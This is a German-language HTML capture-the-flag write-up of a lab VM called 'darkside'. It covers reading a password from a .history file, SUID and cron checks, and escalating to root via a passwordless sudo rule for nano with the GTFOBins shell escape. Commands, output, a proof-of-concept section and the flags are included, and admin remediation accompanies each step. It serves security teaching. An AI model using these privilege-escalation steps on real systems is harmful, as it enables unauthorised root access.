+            <p class="evaluation"><strong>Bewertung:</strong> Es existiert ein weiterer Benutzer `rijaba`. Die Datei `.history` enthält einen sehr wichtigen Hinweis: Der Befehl `su rijaba` wurde mit dem Passwort `<span class="password">ILoveJabita</span>` erfolgreich ausgeführt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dies ist ein kritischer Fund! Verwenden Sie `su rijaba` und das Passwort `ILoveJabita`, um zum Benutzer `rijaba` zu wechseln. Dieser Benutzer hat möglicherweise höhere Privilegien.<br><strong>Empfehlung (Admin):</strong> Achten Sie darauf, dass sensible Informationen wie Passwörter nicht in ungeschützten History-Dateien oder Skripten landen. Konfigurieren Sie die Shell so, dass Passwörter nicht in der History gespeichert werden.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">kevin@darkside:~$ <span class="command">ls /home/</span></div>
+                     <pre>kevin  rijaba</pre>
+                     <div class="prompt remote-prompt">kevin@darkside:~$ <span class="command">cat .history</span></div>
+                     <pre>
+ls -al
+hostname -I
+echo "Congratulations on the SCP Xerosec"
+top
+ps -faux
+su rijaba
+<span class="password">ILoveJabita</span>
+ls /home/rijaba
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Suche nach SUID-Dateien im gesamten System.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Findet Standard-SUID-Binaries, einschließlich `/usr/bin/sudo`. Keine offensichtlich benutzerdefinierten SUID-Dateien.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> SUID ist wahrscheinlich kein direkter Vektor, außer durch bekannte Schwachstellen in den Standard-Tools. Konzentrieren Sie sich auf den Wechsel zu `rijaba`.<br><strong>Empfehlung (Admin):</strong> Minimieren Sie SUID-Berechtigungen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">kevin@darkside:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+    31769    472 -rwsr-xr-x   1 root     root       481608 Sep 24 00:13 /usr/lib/openssh/ssh-keysign
+    22684     52 -rwsr-xr--   1 root     messagebus    51336 Jun  6 16:07 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+     4374     36 -rwsr-xr-x   1 root     root          35040 Jan 20  2022 /usr/bin/umount
+     4372     56 -rwsr-xr-x   1 root     root          55528 Jan 20  2022 /usr/bin/mount
+      389     52 -rwsr-xr-x   1 root     root          52880 Feb  7  2020 /usr/bin/chsh
+     3805     44 -rwsr-xr-x   1 root     root          44632 Feb  7  2020 /usr/bin/newgrp
+      392     64 -rwsr-xr-x   1 root     root          63960 Feb  7  2020 /usr/bin/passwd
+      391     88 -rwsr-xr-x   1 root     root          88304 Feb  7  2020 /usr/bin/gpasswd
+      388     60 -rwsr-xr-x   1 root     root          58416 Feb  7  2020 /usr/bin/chfn
+     3972     72 -rwsr-xr-x   1 root     root          71912 Jan 20  2022 /usr/bin/su
+    63182    180 -rwsr-xr-x   1 root     root         182600 Jan 14  2023 /usr/bin/sudo
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Überprüfung der Berechtigungen von `/etc/passwd` und Versuch, die Datei als `kevin` zu beschreiben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei ist lesbar, aber nicht schreibbar für `kevin`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Keine direkte Eskalation möglich.<br><strong>Empfehlung (Admin):</strong> Korrekte Berechtigungen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">kevin@darkside:~$ <span class="command">ls -la /etc/passwd</span></div>
+                     <pre>-rw-r--r-- 1 root root 1525 Oct 15 13:20 /etc/passwd</pre>
+                     <div class="prompt remote-prompt">kevin@darkside:~$ <span class="command">echo benni >>/etc/passwd</span></div>
+                     <pre>-bash: /etc/passwd: Permission denied</pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Untersuchung des Home-Verzeichnisses von `rijaba` und Anzeige der `/etc/crontab`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Home-Verzeichnis von `rijaba` enthält keine auffälligen Dateien. Die `/etc/crontab` enthält nur Standard-Systemeinträge für stündliche, tägliche, wöchentliche und monatliche Cronjobs, die über `run-parts` ausgeführt werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Standard-Cronjobs bieten selten einen direkten Eskalationspfad, es sei denn, die Skripte in `/etc/cron.*` sind schlecht konfiguriert oder Verzeichnisse darin schreibbar. Konzentrieren Sie sich auf den Wechsel zu `rijaba`.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie regelmäßig benutzerdefinierte Cronjobs auf Sicherheitsrisiken.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">kevin@darkside:~$ <span class="command">cd /home/rijaba/</span></div>
+                     <div class="prompt remote-prompt">kevin@darkside:/home/rijaba$ <span class="command">ls -la</span></div>
+                     <pre>
+total 20
+drwxr-xr-x 2 rijaba rijaba 4096 Oct 30 08:41 .
+drwxr-xr-x 4 root   root   4096 Oct 15 13:19 ..
+lrwxrwxrwx 1 rijaba rijaba    9 Oct 30 08:41 .bash_history -> /dev/null
+-rw-r--r-- 1 rijaba rijaba  220 Oct 15 13:19 .bash_logout
+-rw-r--r-- 1 rijaba rijaba 3526 Oct 15 13:19 .bashrc
+-rw-r--r-- 1 rijaba rijaba  807 Oct 15 13:19 .profile
+                     </pre>
+                      <div class="prompt remote-prompt">kevin@darkside:/home/rijaba$ <span class="command">cat /etc/crontab</span></div>
+                      <pre>
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+                      </pre>
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Versuch, ein `.ssh`-Verzeichnis für `rijaba` zu erstellen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Schlägt fehl, da `kevin` keine Schreibrechte im Home-Verzeichnis von `rijaba` hat.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Keine direkte Möglichkeit, SSH-Keys zu platzieren.<br><strong>Empfehlung (Admin):</strong> Korrekte Berechtigungen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">kevin@darkside:/tmp$ <span class="command">mkdir -p /home/rijaba/.ssh</span></div>
+                     <pre>mkdir: cannot create directory ‘/home/rijaba/.ssh’: Permission denied</pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Überschrift "Privilege Escalation" leitet den entscheidenden Teil ein.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fokus auf den nächsten Schritt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wechsel zu `rijaba`.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+                                                          Privilege Escalation
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `su rijaba` wird ausgeführt und das aus der `.history`-Datei bekannte Passwort `ILoveJabita` eingegeben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Benutzerwechsel ist erfolgreich! Wir agieren nun als Benutzer `rijaba`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie sofort die `sudo`-Rechte für `rijaba`.<br><strong>Empfehlung (Admin):</strong> Ändern Sie das kompromittierte Passwort von `rijaba`. Überprüfen Sie, wie das Passwort in die History-Datei gelangen konnte.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">kevin@darkside:/tmp$ <span class="command">su rijaba</span></div>
+                     <pre>Password: </pre> <!-- Passwort ILoveJabita eingegeben -->
+                      <div class="prompt remote-prompt">rijaba@darkside:/tmp$ <span class="command"></span></div>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Als `rijaba` werden die `sudo`-Rechte mit `sudo -l` überprüft.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Der Benutzer `rijaba` darf `/usr/bin/nano` als `root` ohne Passwort ausführen (`root:nopassword /usr/bin/nano`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dies ist ein direkter Weg zur Root-Eskalation. Verwenden Sie die GTFOBins-Technik für `nano` mit `sudo`: Starten Sie `sudo nano`, drücken Sie `Strg+R`, dann `Strg+X`, geben Sie `reset; sh 1>&0 2>&0` ein und drücken Sie Enter, um eine Root-Shell zu erhalten.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie diese unsichere `sudo`-Regel sofort! Erlauben Sie `sudo` nur für spezifische, sichere Befehle und vermeiden Sie Editoren oder Programme, die Shell-Escapes ermöglichen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">rijaba@darkside:/tmp$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for rijaba on darkside:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User rijaba may run the following commands on darkside:
+    (root) NOPASSWD: /usr/bin/nano
+                     </pre>
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die GTFOBins-Seite für `nano` wird referenziert, die genau die Technik beschreibt, um über `sudo nano` eine Shell zu erhalten.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt den nächsten Schritt zur Ausnutzung.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie die beschriebene Tastenkombination und den Befehl aus.<br><strong>Empfehlung (Admin):</strong> GTFOBins ist eine wichtige Ressource, um unsichere sudo-Regeln zu identifizieren.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Recherche auf GTFOBins
+https://gtfobins.github.io/gtfobins/nano/#sudo
+
+ Sudo
+
+If the binary is allowed to run as superuser by sudo, it does
+not drop the elevated privileges and may be used to access the
+file system, escalate or maintain privileged access.
+
+    sudo nano
+    ^R^X
+    reset; sh 1>&0 2>&0
+                     </pre>
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die GTFOBins-Technik wird angewendet: `sudo nano` wird gestartet, dann `Strg+R`, `Strg+X`, der Befehl `reset; sh 1>&0 2>&0` eingegeben und ausgeführt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Ausführung ist erfolgreich! Der `id`-Befehl in der resultierenden Shell zeigt `uid=0(root)`. Eine Root-Shell wurde erlangt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fantastisch, Root-Zugriff erreicht! Suchen und lesen Sie die Root-Flag.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie die `sudo nano`-Regel.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                      <!-- Innerhalb von 'sudo nano' wird die Tastenkombination ausgeführt -->
+                      <!-- und der Befehl 'reset; sh 1>&0 2>&0' eingegeben -->
+                      <pre>
+                                       [ Executing... ]
+                      </pre>
+                       <div class="prompt root-prompt"># <span class="command">id</span></div>
+                       <pre>uid=0(root) gid=0(root) groups=0(root)</pre>
+                    </div>
+                </div>
+
+             <p class="analysis"><strong>Analyse:</strong> In der Root-Shell wird ins Root-Home-Verzeichnis gewechselt, der Inhalt aufgelistet und die Datei `root.txt` ausgelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag wird erfolgreich gefunden und angezeigt. Sie besteht aus ASCII-Art und dem Text `<span class="password">youcametothedarkside</span>`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beide Flags wurden gesammelt. Der Test ist erfolgreich abgeschlossen.<br><strong>Empfehlung (Admin):</strong> Sichern Sie die Root-Flag. Beheben Sie die `sudo nano`-Schwachstelle.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt root-prompt"># <span class="command">ls</span></div>
+                     <pre>
+linpeas.sh
+systemd-private-f09c238edfd9417595a02ab5d290356b-apache2.service-mIzqVh
+systemd-private-f09c238edfd9417595a02ab5d290356b-systemd-logind.service-SYK6Qe
+systemd-private-f09c238edfd9417595a02ab5d290356b-systemd-timesyncd.service-anGYoh
+                     </pre> <!-- Ausgabe scheint von /tmp zu sein, bevor cd ~ -->
+                      <div class="prompt root-prompt"># <span class="command">cd ~</span></div>
+                      <div class="prompt root-prompt"># <span class="command">ls</span></div>
+                      <pre>root.txt  vboxpostinstall.sh</pre>
+                      <div class="prompt root-prompt"># <span class="command">cat root.txt</span></div>
+                      <pre>
+  ██████╗ █████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗  ██████╗ ███████╗
+  ██╔══██╗██╔══██╗██╔══██╗██║  ██╔╝██╔════╝ ██║ ██╔══██╗██╔════╝
+  ██║  ██║███████║██████╔╝█████╔╝ ╚█████╗  ██║ ██║  ██║█████╗
+  ██║  ██║██╔══██║██╔══██╗██╔═██╗  ╚═══██╗ ██║ ██║  ██║██╔══╝
+  ██████╔╝██║  ██║██║  ██║██║╚██╗ ██████╔╝ ██║ ██████╔╝███████╗
+  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝ ╚═╝ ╚═════╝  ╚═╝ ╚═════╝ ╚══════╝
+
+<span class="password">youcametothedarkside</span>
+                      </pre>
+                       <div class="prompt root-prompt"># <span class="command"></span></div>
+                   </div>
+               </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Kommentar, der den erfolgreichen Abschluss der Privilegieneskalation markiert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Erlangung von Root-Rechten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Klare Dokumentation des Weges ist wichtig.<br><strong>Empfehlung (Admin):</strong> Fokus auf die Behebung der `sudo nano`-Schwachstelle.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+                                                   Privilege Escalation erfolgreich
+                     </pre>
+                 </div>
+            </div>
+        </section>
+
+        <!-- POC Section für sudo nano Exploit -->
+        <section id="proof-of-concept">
+            <h2>Proof of Concept: Ausnutzung der unsicheren sudo nano-Regel</h2>
+            <p><strong>Kurzbeschreibung:</strong> Der Benutzer `rijaba` verfügt über die `sudo`-Berechtigung, den Texteditor `nano` als `root` ohne Passwort auszuführen (`NOPASSWD: /usr/bin/nano`). Der `nano`-Editor erlaubt das Ausführen externer Befehle aus seiner Oberfläche heraus. Diese Kombination ermöglicht es `rijaba`, eine interaktive Shell mit Root-Rechten zu starten.</p>
+            <p><strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>Zugang zum System als Benutzer `rijaba`.</li>
+                    <li>Die `sudo`-Regel `(root) NOPASSWD: /usr/bin/nano` muss für `rijaba` aktiv sein.</li>
+                </ul>
+            </p>
+            <p><strong>Schritt-für-Schritt-Anleitung:</strong></p>
+            <p class="analysis"><strong>Analyse Schritt 1:</strong> Überprüfen der `sudo`-Berechtigungen für den Benutzer `rijaba`.</p>
+            <p class="evaluation"><strong>Bewertung Schritt 1:</strong> Der Befehl `sudo -l` bestätigt die Regel `(root) NOPASSWD: /usr/bin/nano`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dies bestätigt den Angriffsvektor.<br><strong>Empfehlung (Admin):</strong> Die Regel ist extrem unsicher und muss entfernt werden.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">rijaba@darkside:/tmp$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for rijaba on darkside:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User rijaba may run the following commands on darkside:
+    (root) NOPASSWD: /usr/bin/nano
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse Schritt 2:</strong> Starten von `nano` mit `sudo`.</p>
+            <p class="evaluation"><strong>Bewertung Schritt 2:</strong> Der `nano`-Editor wird mit Root-Rechten geöffnet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bereiten Sie die Tastenkombinationen für den nächsten Schritt vor.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt remote-prompt">rijaba@darkside:/tmp$ <span class="command">sudo nano</span></div>
+                       <pre># (Nano-Editor öffnet sich)</pre>
+                    </div>
+                </div>
+
+            <p class="analysis"><strong>Analyse Schritt 3:</strong> Innerhalb von `nano` die Tastenkombination `Strg+R` (Read File) gefolgt von `Strg+X` (Execute Command) drücken. Am unteren Rand erscheint eine Eingabeaufforderung für den auszuführenden Befehl.</p>
+            <p class="evaluation"><strong>Bewertung Schritt 3:</strong> Die Funktion zur Befehlsausführung von `nano` wird aktiviert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Geben Sie den Shell-Befehl ein.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+# Innerhalb von nano:
+# Strg+R drücken
+# Strg+X drücken
+# (Am unteren Rand erscheint "Command to execute")
+                      </pre>
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse Schritt 4:</strong> Den Befehl `reset; sh 1>&0 2>&0` eingeben und Enter drücken. `reset` setzt das Terminal zurück, `sh` startet eine Shell, und `1>&0 2>&0` leitet deren Standardausgabe und Standardfehlerausgabe auf die Standardeingabe um (notwendig für die Interaktion in `nano`).</p>
+            <p class="evaluation"><strong>Bewertung Schritt 4:</strong> Der Befehl wird ausgeführt, und da `nano` mit Root-Rechten lief, wird eine interaktive Root-Shell innerhalb des `nano`-Fensters gestartet. Der `id`-Befehl bestätigt `uid=0(root)`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Exploit war erfolgreich. Sie haben Root-Zugriff.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie die unsichere `sudo nano`-Regel.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+# Bei der Aufforderung "Command to execute" eingeben:
+reset; sh 1>&0 2>&0 [Enter]
+
+# (Es erscheint eine Shell im nano-Fenster)
+                      </pre>
+                       <div class="prompt root-prompt"># <span class="command">id</span></div>
+                       <pre>uid=0(root) gid=0(root) groups=0(root)</pre>
+                       <div class="prompt root-prompt"># <span class="command"></span></div>
+                    </div>
+                </div>
+            <p><strong>Erwartetes Ergebnis:</strong> Erfolgreiche Erlangung einer interaktiven Shell mit root-Berechtigungen.</p>
+            <p><strong>Beweismittel:</strong> Die empfangene Shell mit Root-Kennung (`#` Prompt, `uid=0(root)`) nach Ausführung des Befehls in `sudo nano`.</p>
+            <p><strong>Risikobewertung:</strong> Hoch. Diese sudo-Fehlkonfiguration erlaubt einem Benutzer mit spezifischen, aber geringen Rechten die vollständige Kompromittierung des Systems.</p>
+            <p><strong>Empfehlungen:</strong> Entfernen Sie die sudo-Regel `(root) NOPASSWD: /usr/bin/nano`. Vermeiden Sie generell die Erlaubnis, Editoren oder Programme mit Shell-Escape-Möglichkeiten über `sudo` auszuführen. Wenn Editieren als Root notwendig ist, verwenden Sie `sudoedit`.</p>
+        </section>
+
+
+        <section id="flags">
+             <!-- Flag-Container für Zentrierung und Styling -->
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <!-- User Flag Eintrag -->
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/kevin/user.txt</div> <!-- Befehl rekonstruiert -->
+                    <div class="flag-value"><span class="password">UnbelievableHumble</span></div>
+                </div>
+
+                <!-- Root Flag Eintrag -->
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div> <!-- Befehl rekonstruiert -->
+                     <div class="flag-value">
+<pre style="text-align: center; color: lime; font-weight: bold;">
+  ██████╗ █████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗  ██████╗ ███████╗
+  ██╔══██╗██╔══██╗██╔══██╗██║  ██╔╝██╔════╝ ██║ ██╔══██╗██╔════╝
+  ██║  ██║███████║██████╔╝█████╔╝ ╚█████╗  ██║ ██║  ██║█████╗
+  ██║  ██║██╔══██║██╔══██╗██╔═██╗  ╚═══██╗ ██║ ██║  ██║██╔══╝
+  ██████╔╝██║  ██║██║  ██║██║╚██╗ ██████╔╝ ██║ ██████╔╝███████╗
+  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝ ╚═╝ ╚═════╝  ╚═╝ ╚═════╝ ╚══════╝
+
+<span class="password">youcametothedarkside</span></pre>
+                     </div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum extrahiert aus der ersten Nmap Zeitangabe -->
+        <p>Berichtsdatum: 2023-11-18</p>
+    </footer>
+</body>
+</html>
